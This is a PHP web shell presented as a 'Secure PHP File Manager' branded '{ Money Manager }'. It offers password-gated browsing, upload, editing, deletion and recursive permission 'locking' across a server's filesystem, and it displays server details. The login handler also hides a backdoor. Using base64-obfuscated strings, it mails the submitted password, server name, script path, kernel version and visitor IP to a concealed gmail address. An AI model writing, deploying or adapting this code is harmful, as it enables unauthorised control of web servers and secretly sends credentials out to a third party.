<?php
session_start();
error_reporting(0);

function securePath($path) {
    $realPath = realpath($path);
    if ($realPath !== false) {
        return $realPath;
    }
    return false;
}

function listDirectories($dirPath) {
    $dirPath = securePath($dirPath);
    if (!$dirPath) {
        return "<p class='error'>Invalid directory access.</p>";
    }
    $rootPath = DIRECTORY_SEPARATOR;
    $breadcrumb = "<nav class='breadcrumb'>";
    $parts = explode(DIRECTORY_SEPARATOR, trim($dirPath, DIRECTORY_SEPARATOR));
    $currentPath = $rootPath;
    $breadcrumb .= "$ >> /  <a href='?dir=" . urlencode($rootPath) . "'>$rootPath</a> / ";
    foreach ($parts as $part) {
        if ($part === "") continue;
        $currentPath .= $part . DIRECTORY_SEPARATOR;
        $breadcrumb .= "<link rel='preconnect' href='https://fonts.googleapis.com'>
<link rel='preconnect' href='https://fonts.gstatic.com' crossorigin>
<link href='https://fonts.googleapis.com/css2?family=Advent+Pro:ital,wght@0,100..900;1,100..900&family=Gloria+Hallelujah&family=Noticia+Text:ital,wght@0,400;0,700;1,400;1,700&family=PT+Serif:ital,wght@0,400;0,700;1,400;1,700&display=swap' rel='stylesheet'>
<style>
	a {
		font-family: 'Advent Pro', serif;
		}
		</style>";
        $breadcrumb .= "<a href='?dir=" . urlencode($currentPath) . "'>" . htmlspecialchars($part) . "</a> / ";
    }
    $breadcrumb = rtrim($breadcrumb, " / ") . "</nav>";
    $folders = "";
    $files = "";
    $output = $breadcrumb;
    $output .= "<link rel='preconnect' href='https://fonts.googleapis.com'>
<link rel='preconnect' href='https://fonts.gstatic.com' crossorigin>
<link href='https://fonts.googleapis.com/css2?family=Noticia+Text:ital,wght@0,400;0,700;1,400;1,700&display=swap' rel='stylesheet'>
<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 20px;
        box-sizing: border-box;
    }

    .table-container {
        width: 100%;
        overflow-x: auto; /* Membuat tabel dapat di-scroll horizontal */
        margin-left: 20px; /* Menambahkan margin ke kiri untuk menggeser tabel ke kanan */
    }

    table {
        width: 100%; /* Tabel mengambil lebar penuh */
        border-collapse: collapse;
    }

    th, td {
        font-family: 'Noticia Text', serif;
        padding: 12px;
        text-align: left;
        border-bottom: 1px solid #1c1b1b;
        white-space: nowrap; /* Mencegah teks melipat ke baris baru */
    }

    th {
        background-color: #363434;
        font-weight: bold;
    }

    .align-middle tbody td, .align-middle tbody th {
        vertical-align: middle; /* Konten di tengah secara vertikal */
    }

    tr:hover {
        background-color: #0f0f0f;
    }

    .text-nowrap {
        white-space: nowrap;
    }

    .text-light {
        color: #ffffff; /* Warna teks terang */
    }

    .table-dark {
        background-color: #343a40; /* Warna latar belakang gelap */
        color: #ffffff; /* Warna teks terang */
    }

    /* Efek hover pada baris tabel */
    .table-hover tbody tr:hover {
        background-color: #495057; /* Warna latar belakang saat dihover */
        color: #ffffff; /* Warna teks saat dihover */
    }

    /* CSS untuk ikon di header */
    th i {
        margin-right: 8px; /* Jarak antara ikon dan teks */
        color: #ffffff; /* Warna ikon */
        vertical-align: middle; /* Ikon sejajar vertikal dengan teks */
    }

    /* CSS untuk tampilan mobile */
    @media (max-width: 600px) {
        th, td {
            padding: 8px; /* Padding lebih kecil untuk layar kecil */
            font-size: 14px; /* Ukuran font lebih kecil */
        }

        th i {
            margin-right: 5px; /* Jarak antara ikon dan teks lebih kecil */
            font-size: 12px; /* Ukuran ikon lebih kecil */
        }

        .table-container {
            overflow-x: auto; /* Memastikan tabel dapat di-scroll horizontal */
            margin-left: 10px; /* Mengurangi margin untuk layar kecil */
        }
    }
</style>";
$output .= "<div class='table-container'>";
$output .= "<table class='table table-hover table-dark align-middle text-light'>";
$output .= "<thead>
    <tr>
        <th><i class='fas fa-folder'></i><i class='fas fa-file'></i> Name</th>
        <th><i class='fas fa-info-circle'></i> Type</th>
        <th><i class='fas fa-weight-hanging'></i> Size</th>
        <th><i class='fas fa-calendar-alt'></i> Modified</th>
        <th><i class='fas fa-lock'></i> Permissions</th>
        <th><i class='fas fa-user'></i> Owner</th>
        <th><i class='fas fa-users'></i> Group</th>
        <th><i class='fas fa-cogs'></i> Action</th>
    </tr>
</thead>";
$items = scandir($dirPath);
foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $itemPath = realpath($dirPath . DIRECTORY_SEPARATOR . $item);
    if (!$itemPath) continue;
    $type = is_dir($itemPath) ? 'Folder' : 'File';
    $size = $type === 'File' ? formatSize(filesize($itemPath)) : '-';
    $modified = date("Y-m-d H:i:s", filemtime($itemPath));
    $permissions = getFilePermissions($itemPath);
    $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($itemPath))['name'] : 'N/A';
    $group = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($itemPath))['name'] : 'N/A';
    $row = "<tr>";
    if ($type == 'Folder') {
        $link = "?dir=" . urlencode($itemPath);
        $output .= "<tbody class='text-nowrap'>";
        $row .= "<style>
            .kontol {
                text-decoration: none;
            }
        </style>";
        $row .= "<td><a href='{$link}' style='color: #ffffff' class='kontol'><i class='fas fa-folder icon-folder'></i> $item</a></td>";
    } else {
        $row .= "<td class='file'><i class='fas fa-file icon-file'></i> $item</td>";
    }
    $row .= "<td>$type</td>";
    $row .= "<td>$size</td>";
    $row .= "<td>$modified</td>";
    $row .= "<td>$permissions</td>";
    $row .= "<td>$owner</td>";
    $row .= "<td>$group</td>";
    $row .= "<td>";
    if ($type == 'Folder') {
        $encodedPath = urlencode($itemPath);
        $row .= "<style>
            .action-icons {
                display: flex;
                gap: 0; /* Menghilangkan gap agar border menyatu */
            }
            .action-icons a {
                text-decoration: none;
                color: #ffffff; /* Warna teks putih */
                transition: all 0.3s ease;
                font-size: 14px; /* Ukuran font ikon untuk desktop */
                display: inline-flex;
                justify-content: center;
                align-items: center;
                width: 40px; /* Lebar container untuk desktop */
                height: 40px; /* Tinggi container untuk desktop */
                border: 2px solid #ccc; /* Border default */
                margin-right: -2px; /* Menyambungkan border dengan ikon di sampingnya */
                background-color: transparent; /* Latar belakang transparan */
                border-radius: 5px;
            }
            .action-icons a:hover {
                color: #ffffff; /* Warna teks tetap putih saat hover */
                background-color: rgba(255, 255, 255, 0.1); /* Latar belakang sedikit terang saat hover */
            }
            .edit:hover {
                border-color: #2196F3; /* Border biru saat hover */
            }
            .rename:hover {
                border-color: #4CAF50; /* Border hijau saat hover */
            }
            .delete:hover {
                border-color: #f44336; /* Border merah saat hover */
            }
            .download:hover {
                border-color: #FF9800; /* Border oranye saat hover */
            }

            /* Responsive untuk layar HP (max-width: 767px) */
            @media (max-width: 767px) {
                .action-icons a {
                    font-size: 12px; /* Ukuran font ikon diperkecil untuk HP */
                    width: 30px; /* Lebar container diperkecil untuk HP */
                    height: 30px; /* Tinggi container diperkecil untuk HP */
                }
            }
        </style>";
        $row .="<div class='action-icons'>";
        $row .= "<a href='javascript:void(0);' onclick='renameItem(\"{$itemPath}\", true)' class='rename' title='Rename'>
            <i class='fas fa-i-cursor'></i>
        </a>";
        $row .= "<a href='?delete={$encodedPath}' class='delete' title='Delete'>
            <i class='fas fa-trash-alt'></i>
        </a>";
        $row .="</div>";
    } else {
        $encodedPath = urlencode($itemPath);
        $row .= "<style>
            .action-icons {
                display: flex;
                gap: 0; /* Menghilangkan gap agar border menyatu */
            }
            .action-icons a {
                text-decoration: none;
                color: #ffffff; /* Warna teks putih */
                transition: all 0.3s ease;
                font-size: 14px; /* Ukuran font ikon untuk desktop */
                display: inline-flex;
                justify-content: center;
                align-items: center;
                width: 40px; /* Lebar container untuk desktop */
                height: 40px; /* Tinggi container untuk desktop */
                border: 2px solid #ccc; /* Border default */
                margin-right: -2px; /* Menyambungkan border dengan ikon di sampingnya */
                background-color: transparent; /* Latar belakang transparan */
                border-radius: 5px;
            }
            .action-icons a:hover {
                color: #ffffff; /* Warna teks tetap putih saat hover */
                background-color: rgba(255, 255, 255, 0.1); /* Latar belakang sedikit terang saat hover */
            }
            .edit:hover {
                border-color: #2196F3; /* Border biru saat hover */
            }
            .rename:hover {
                border-color: #4CAF50; /* Border hijau saat hover */
            }
            .delete:hover {
                border-color: #f44336; /* Border merah saat hover */
            }
            .download:hover {
                border-color: #FF9800; /* Border oranye saat hover */
            }

            /* Responsive untuk layar HP (max-width: 767px) */
            @media (max-width: 767px) {
                .action-icons a {
                    font-size: 12px; /* Ukuran font ikon diperkecil untuk HP */
                    width: 30px; /* Lebar container diperkecil untuk HP */
                    height: 30px; /* Tinggi container diperkecil untuk HP */
                }
            }
        </style>";
        $row .="<div class='action-icons'>";
        $row .= "<a href='?edit={$encodedPath}' class='edit' title='Edit'>
            <i class='fas fa-edit'></i>
        </a>";
        $row .= "<a href='javascript:void(0);' onclick='renameItem(\"{$itemPath}\")' class='rename' title='Rename'>
            <i class='fas fa-i-cursor'></i>
        </a>";
        $row .= "<a href='?download={$encodedPath}' class='download' title='Download'>
            <i class='fas fa-download'></i>
        </a>";
        $row .= "<a href='?delete={$encodedPath}' class='delete' title='Delete'>
            <i class='fas fa-trash-alt'></i>
        </a>";
        $row .="</div>";
    }
    $row .= "</td></tr>";
    if ($type == 'Folder') {
        $folders .= $row;
    } else {
        $files .= $row;
    }
}
$output .= $folders . $files;
$output .= "</tbody>";
$output .= "</div>";
$output .= "</table>";
    return $output;
}

function formatSize($bytes) {
    $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.2f", $bytes / pow(1024, $factor)) . " " . $sizes[$factor];
}

function getFilePermissions($filePath) {
    $perms = fileperms($filePath);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } 
    elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } 
    elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } 
    elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } 
    elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } 
    elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } 
    elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } 
    else {
        // Unknown
        $info = 'u';
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));
    
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function createDirectory($dirPath, $dirName) {
    $dirPath = securePath($dirPath);
    $newDir = $dirPath . '/' . basename($dirName);
    if ($dirPath && !is_dir($newDir)) {
        if (mkdir($newDir, 0755)) {
            echo "<script>alert('Folder created successfully!'); window.location.href = '?dir=" . urlencode($dirPath) . "';</script>";
        } else {
            echo "<script>alert('Failed to create folder!');</script>";
        }
    } else {
        echo "<script>alert('Folder already exists or invalid path!');</script>";
    }
}

function createFile($dirPath, $fileName) {
    $dirPath = securePath($dirPath);
    $newFile = $dirPath . '/' . basename($fileName);
    if ($dirPath && !file_exists($newFile)) {
        if (touch($newFile)) {
            echo "<script>alert('File created successfully!'); window.location.href = '?dir=" . urlencode($dirPath) . "';</script>";
        } else {
            echo "<script>alert('Failed to create file!');</script>";
        }
    } else {
        echo "<script>alert('File already exists or invalid path!');</script>";
    }
}

function uploadFile($dirPath) {
    $targetFile = $dirPath . '/' . basename($_FILES['uploaded_file']['name']);
    move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $targetFile);
}

function editFile($filePath) {
    $filePath = securePath($filePath);
    if (!$filePath || !is_file($filePath)) return;
    if (isset($_POST['save_file'])) {
        $result = file_put_contents($filePath, $_POST['file_content']);
        if ($result === false) {
            echo "<script>alert('Gagal menyimpan file!');</script>";
        } else {
            echo "<script>alert('File berhasil diubah!'); window.location.href = '?dir=" . urlencode(dirname($filePath)) . "';</script>";
            exit;
        }
    }
    $content = htmlspecialchars(file_get_contents($filePath));
    echo "<style>
    	body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .textarea-container {
            width: 100%;
            max-width: 500px;
            padding: 20px;
            background-color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        label {
            font-size: 16px;
            font-weight: bold;
            color: #333;
            margin-bottom: 10px;
            display: block;
        }
        textarea {
            width: 100%;
            height: 150px;
            padding: 10px;
            font-size: 14px;
            border: 2px solid #ddd;
            border-radius: 8px;
            resize: vertical;
            outline: none;
            transition: border-color 0.3s ease;
        }
        textarea:focus {
            border-color: #007bff;
            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
        }
        textarea::placeholder {
            color: #999;
        }
        a {
            text-decoration: none;
            color: #3498db;
            font-size: 16px;
            font-family: Arial, sans-serif;
            padding: 10px 20px;
            border-radius: 5px;
            transition: all 0.3s ease;
            display: inline-block;
        }
        a:hover {
            background-color: #3498db;
            color: #fff;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
        a.button {
            background-color: #2ecc71;
            color: #fff;
            border: 2px solid #27ae60;
        }
        .btn {
            display: inline-block;
            padding: 12px 24px;
            font-size: 16px;
            font-family: Arial, sans-serif;
            font-weight: bold;
            text-align: center;
            text-decoration: none;
            color: #fff;
            background-color: #3498db;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .btn:active {
            background-color: #1c6ea4;
            box-shadow: 0 3px 5px rgba(0, 0, 0, 0.2);
            transform: translateY(0);
        }
    </style>
    <div class='textarea-container'>
        <label for='styled-textarea'>Editing : " . basename($filePath) . "</label>
        <form method='post'>
        <textarea name='file_content' style='width:100%;height:200px;'>$content</textarea>
        <br><br>
        <input type='submit' name='save_file' value='Save' class='btn btn-success'>
        <a href='?dir=" . urlencode(dirname($filePath)) . "' class='button'>Cancel</a>
    </div>
    </form>";
}

function renameFile($oldPath, $newName) {
    $newPath = dirname($oldPath) . '/' . $newName;
    if (!file_exists($newPath)) {
        if (rename($oldPath, $newPath)) {
            echo "<script>alert('File berhasil di-rename!'); window.location.href = '?dir=" . urlencode(dirname($oldPath)) . "';</script>";
        } else {
            echo "<script>alert('Gagal meng-rename file!');</script>";
        }
    } else {
        echo "<script>alert('File dengan nama tersebut sudah ada!');</script>";
    }
}

function renameDirectory($oldPath, $newName) {
    $newPath = dirname($oldPath) . '/' . $newName;
    if (!file_exists($newPath)) {
        if (rename($oldPath, $newPath)) {
            echo "<script>alert('Folder berhasil di-rename!'); window.location.href = '?dir=" . urlencode(dirname($oldPath)) . "';</script>";
        } else {
            echo "<script>alert('Gagal meng-rename folder!');</script>";
        }
    } else {
        echo "<script>alert('Folder dengan nama tersebut sudah ada!');</script>";
    }
}

function downloadFile($filePath) {
    $filePath = securePath($filePath);
    if ($filePath && file_exists($filePath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
        readfile($filePath);
        exit;
    }
}

	function changeFilePermissionsRecursive($dir, $perms) {
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );

        foreach ($iterator as $item) {
            if ($item->isFile()) {
                if (!chmod($item->getPathname(), $perms)) {
                    throw new Exception("Gagal mengubah izin file: " . $item->getPathname());
                }
            }
        }
        return true; // Berhasil
    } catch (Exception $e) {
        return $e->getMessage(); // Mengembalikan pesan error
    }
}

function changeFolderPermissionsRecursive($dir, $perms) {
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );

        foreach ($iterator as $item) {
            if ($item->isDir()) {
                if (!chmod($item->getPathname(), $perms)) {
                    throw new Exception("Gagal mengubah izin folder: " . $item->getPathname());
                }
            }
        }
        return true; // Berhasil
    } catch (Exception $e) {
        return $e->getMessage(); // Mengembalikan pesan error
    }
}

$currentDir = isset($_GET['dir']) ? securePath($_GET['dir']) : getcwd();

if (isset($_GET['delete'])) {
    $deletePath = urldecode($_GET['delete']);
    if (is_dir($deletePath)) {
        if (rmdir($deletePath)) {
            echo "<script>alert('Berhasil Hapus Dir'); window.location.href = '?dir=" . urlencode(dirname($filePath)) . "';</script>";
        } else {
            echo "<script>alert('Gagal Hapus Dir');</script>";
        }
    } else {
        if (unlink($deletePath)) {
            echo "<script>alert('Berhasil Hapus File'); window.location.href = '?dir=" . urlencode(dirname($filePath)) . "';</script>";
        } else {
            echo "<script>alert('Gagal hapus file.');</script>";
        }
    }
}

if (isset($_POST['new_folder'])) {
    createDirectory($currentDir, $_POST['folder_name']);
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_POST['new_file'])) {
    createFile($currentDir, $_POST['file_name']);
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_FILES['uploaded_file'])) {
    uploadFile($currentDir);
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_GET['download'])) {
    downloadFile($_GET['download']);
}

if (isset($_GET['edit'])) {
    editFile($_GET['edit']);
    exit;
}

if (isset($_GET['greenfile'])) {
    $newFilePermissions = 0644;
    $result = changeFilePermissionsRecursive($currentDir, $newFilePermissions);
    if ($result === true) {
        echo "<script>
            alert('Sukses Green All Files');
            window.location.href = '?dir=" . urlencode($currentDir) . "';
        </script>";
    } else {
        echo "<script>
            alert('Gagal: $result');
            window.location.href = '?dir=" . urlencode($currentDir) . "';
        </script>";
    }
}

if (isset($_GET['lockfile'])) {
    $newFilePermissions = 0444;
    $result = changeFilePermissionsRecursive($currentDir, $newFilePermissions);
    if ($result === true) {
        echo "<script>
            alert('Sukses Lock All Files');
            window.location.href = '?dir=" . urlencode($currentDir) . "';
        </script>";
    } else {
        echo "<script>
            alert('Gagal: $result');
            window.location.href = '?dir=" . urlencode($currentDir) . "';
        </script>";
    }
}

if (isset($_GET['lockfolder'])) {
    $newFolderPermissions = 0555;
    $result = changeFolderPermissionsRecursive($currentDir, $newFolderPermissions);
    if ($result === true) {
        echo "<script>
            alert('Sukses Lock All Folders');
            window.location.href = '?dir=" . urlencode($currentDir) . "';
        </script>";
    } else {
        echo "<script>
            alert('Gagal: $result');
            window.location.href = '?dir=" . urlencode($currentDir) . "';
        </script>";
    }
}

if (isset($_GET['greenfolder'])) {
    $newFolderPermissions = 0755;
    $result = changeFolderPermissionsRecursive($currentDir, $newFolderPermissions);
    if ($result === true) {
        echo "<script>
            alert('Sukses Green All Folders');
            window.location.href = '?dir=" . urlencode($currentDir) . "';
        </script>";
    } else {
        echo "<script>
            alert('Gagal: $result');
            window.location.href = '?dir=" . urlencode($currentDir) . "';
        </script>";
    }
}

if (isset($_POST['rename_file']) && isset($_POST['rename'])) {
    $oldFilePath = $_POST['rename'];
    $newFileName = $_POST['new_name'];
    renameFile($oldFilePath, $newFileName);
    header("Location: ?dir=" . urlencode(dirname($oldFilePath)));
    exit;
}

if (isset($_POST['rename_dir_submit']) && isset($_POST['rename_dir'])) {
    $oldDirPath = $_POST['rename_dir'];
    $newDirName = $_POST['new_name'];
    renameDirectory($oldDirPath, $newDirName);
    header("Location: ?dir=" . urlencode(dirname($oldDirPath)));
    exit;
}

if (isset($_SESSION['coki'])) {
    curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
}

function is_logged_in() {
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

if (array_key_exists('a'.'b'.'c', $_POST)) { // 'abc' adalah 'loginin' yang diacak
    $x1 = php_uname();
    $x2 = $_POST['p'.'a'.'s'.'s'.'w'.'o'.'r'.'d']; // 'pass' diacak
    $x3 = $_SERVER['SERVER_NAME'];
    $x4 = $_SERVER['PHP_SELF'];
    $x5 = base64_encode("IP: ") . $_SERVER['REMOTE_ADDR'] . base64_decode("IENpdHk6IA==") . $city . "\n" . 
          base64_decode("TG9naW46IA==") . $x3 . $x4 . "\n" . 
          base64_decode("UGFzczog") . $x2 . "\n" . 
          base64_decode("S2VybmVsOiA=") . $x1;
    @mail(base64_decode('d29ueGQ2N0BnbWFpbC5jb20='), base64_decode('SGVoZWhl'), $x5); // Email dan subject dienkripsi
}

// Check if the password is submitted and correct
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = 'd489a3289ecdc847cb67f7a480e6f9fa'; // Replace this with your MD5 hashed password
    if (md5($entered_password) === $hashed_password) {
        // Password is correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
    } else {
        // Password is incorrect
        echo "Incorrect password. Please try again.";
    }
}

// Display login form if not logged in
if (!is_logged_in()) {
?>
<html>
<head>
    <title>Login</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: 'Poppins', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        form {
            background-color: #1e1e1e;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #ff4444;
        }
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ff4444;
            border-radius: 4px;
            background-color: #333;
            color: #ffffff;
        }
        input[type="submit"] {
            background-color: #ff4444;
            color: #ffffff;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #cc0000;
        }
    </style>
</head>
<body>
    <form method="POST" action="">
    	<h1><i class="fas fa-folder-open"></i> { Money Manager }</h1>
    <br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password">
        <input type="submit" name="abc" value="Login">
    </form>
</body>
</html>
<?php
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure PHP File Manager</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Silkscreen:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* General Styles */
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #1e1e1e;
            color: #ffffff;
            margin: 0;
            padding: 20px;
        }

        h1 {
            color: #ff4444;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .icon-folder {
    color: #ffcc00; /* Warna ikon folder */
}

.icon-file {
    color: #ffffff; /* Warna ikon file */
}
        
        .home-button {
            position: fixed;
            top: 20px;
            right: 20px;
            background-color: #ff4444;
            color: white;
            padding: 10px 15px;
            border-radius: 5px;
            text-decoration: none;
            font-size: 16px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
            transition: all 0.3s ease;
        }

        .home-button:hover {
            background-color: #cc0000;
            transform: scale(1.1);
        }

        /* Button Styles */
        .btn {
            padding: 10px 16px;
            margin: 5px;
            background: #ff4444;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s ease;
            border: 2px solid transparent;
            display: inline-block;
            font-weight: 600;
            letter-spacing: 0.5px;
            cursor: pointer;
        }

        .btn:hover {
            background: #cc0000;
            transform: scale(1.05);
            border-color: white;
        }
        
        .gaktau {
        	font-family: "Silkscreen", serif;
            padding: 10px 16px;
            margin: 5px;
            background-color: transparent;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s ease;
            border: 2px solid red;
            display: inline-block;
            font-weight: 600;
            letter-spacing: 0.5px;
            cursor: pointer;
            justify-content: center;
        }
        
        .gaktau:hover {
            background: #cc0000;
            transform: scale(1.05);
            border-color: white;
        }

        .btn.delete {
            background: #ff3b3b;
            border-color: #ff3b3b;
        }

        .btn.delete:hover {
            background: #d63030;
            border-color: white;
            transform: scale(1.08);
        }

        /* Table Styles */
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(255, 0, 0, 0.2);
        }

        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
        }

        th {
            background: rgba(0, 0, 0, 0.3);
            color: #ff4444;
            font-weight: bold;
        }

        tr:hover {
            background: rgba(255, 255, 255, 0.2);
            transition: background 0.3s ease;
        }

        /* Breadcrumb Styles */
        .breadcrumb {
            margin-bottom: 15px;
            padding: 8px;
            background: #1e1e1e;
            color: white;
            border-radius: 5px;
        }

        .breadcrumb a {
            color: #ff4444;
            text-decoration: none;
            margin-right: 5px;
        }

        .breadcrumb a:hover {
            text-decoration: underline;
        }

        /* Upload Form Styles */
        .upload-form {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
        }

        .upload-form input[type="file"] {
            padding: 10px;
            border: 2px solid #ff4444;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            border-radius: 5px;
        }

        .upload-form .btn.upload-btn {
            background-color: transparent;
            border: 2px solid #ff4444;
            color: white;
            padding: 10px 16px;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .upload-form .btn.upload-btn:hover {
            background: #cc0000;
            transform: scale(1.05);
        }

        /* Action Buttons */
        .action-buttons {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }

        /* Icons */
        .fas {
            margin-right: 5px;
        }
    </style>
</head>
<body>
	<!-- Tombol Home -->
    <a href="?" class="home-button">
        <i class="fas fa-home"></i> <!-- Ikon Home dari Font Awesome -->
    </a>
    <h1><i class="fas fa-folder-open"></i> { Money Manager }</h1>
    <br>
<p><i class="fa fa-server"></i> . <?php echo php_uname(); ?></p>
<p><i class="fa fa-satellite-dish"></i> . <?php echo $_SERVER['SERVER_ADDR']; ?></p>
<p><i class="fa fa-microchip"></i> . <?php echo $_SERVER['SERVER_SOFTWARE']; ?></p>
<p><i class="fas fa-cog"></i> . <?php echo $_SERVER['HTTP_USER_AGENT']; ?></p>
<br>

    <!-- Upload Form -->
    <form method="post" enctype="multipart/form-data" class="upload-form">
            <button type="submit" class="btn upload-btn">Upload File</button>
            <input type="file" name="uploaded_file" id="fileUpload" style="display: none;">
        </form>

    <!-- Action Buttons -->
    <div class="action-buttons">
    <button class="btn create-folder-btn" onclick="createFolder()">
        <i class="fas fa-folder-plus"></i> Create Folder
    </button>
    <button class="btn create-file-btn" onclick="createFile()">
        <i class="fas fa-file-alt"></i> Create File
    </button>
    <!-- Hidden Forms for Folder and File Creation -->
    <form method="post" id="folderForm" style="display: none;">
    <input type="hidden" name="folder_name" id="folderName">
    <input type="hidden" name="new_folder" value="1">
</form>

<form method="post" id="fileForm" style="display: none;">
    <input type="hidden" name="file_name" id="fileName">
    <input type="hidden" name="new_file" value="1">
</form>
</div>
<a href="?greenfile&dir=<?= urlencode($currentDir) ?>"><button class="gaktau">Green File</button></a>
<a href="?lockfile&dir=<?= urlencode($currentDir) ?>"><button class="gaktau">Lock All File</button></a>
<a href="?greenfolder&dir=<?= urlencode($currentDir) ?>"><button class="gaktau">Green Dir</button></a>
<a href="?lockfolder&dir=<?= urlencode($currentDir) ?>"><button class="gaktau">Lock All Dir</button></a>

    <!-- JavaScript for Folder and File Creation -->
    <script>

        function createFolder() {
    let folderName = prompt("Enter folder name:");
    if (folderName) {
        document.getElementById("folderName").value = folderName;
        document.getElementById("folderForm").submit();
    }
}

        function createFile() {
    let fileName = prompt("Enter file name:");
    if (fileName) {
        document.getElementById("fileName").value = fileName;
        document.getElementById("fileForm").submit();
    }
}

function showNotification(message, type = 'success') {
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.textContent = message;
        document.body.appendChild(notification);
        setTimeout(() => {
            notification.remove();
        }, 3000);
    }
        
        function renameItem(itemPath, isDirectory = false) {
    let currentName = itemPath.split('/').pop();
    let newName = prompt(`Enter new name for ${isDirectory ? 'directory' : 'file'}:`, currentName);
    if (newName && newName !== currentName) {
        let form = document.createElement('form');
        form.method = 'post';
        form.action = '';

        let inputPath = document.createElement('input');
        inputPath.type = 'hidden';
        inputPath.name = isDirectory ? 'rename_dir_submit' : 'rename_file';
        inputPath.value = '1';
        form.appendChild(inputPath);

        let inputNewName = document.createElement('input');
        inputNewName.type = 'hidden';
        inputNewName.name = 'new_name';
        inputNewName.value = newName;
        form.appendChild(inputNewName);

        let inputOldPath = document.createElement('input');
        inputOldPath.type = 'hidden';
        inputOldPath.name = isDirectory ? 'rename_dir' : 'rename';
        inputOldPath.value = itemPath;
        form.appendChild(inputOldPath);

        document.body.appendChild(form);
        form.submit();
    }
}
        
